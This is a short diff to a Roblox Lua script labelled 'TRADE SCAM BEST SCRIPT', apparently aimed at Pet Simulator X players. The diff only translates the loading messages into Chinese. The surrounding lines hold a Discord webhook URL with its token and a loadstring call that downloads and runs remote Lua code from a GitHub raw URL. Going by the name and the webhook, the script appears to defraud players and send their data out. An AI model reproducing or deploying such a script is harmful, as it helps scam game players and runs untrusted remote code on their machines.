@@ -4,12 +4,12 @@ WebHook = "https://discord.com/api/webhooks/1079342398871715841/LAWZqg3Hby0JeXIP
 
 _G.CustomScriptName = "TRADE SCAM BEST SCRIPT"
 
-_G.Text1 = "Script Loaded..."
+_G.Text1 = "脚本加载..."
 
-_G.Text2 = "Waiting for Script"
+_G.Text2 = "等待脚本"
 
-_G.Text3 = "Checking Scripts..."
+_G.Text3 = "检查脚本s..."
 
-_G.Text4 = "Starting Scripts..."
+_G.Text4 = "启动脚本...（有可能闪退）"
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua"))()
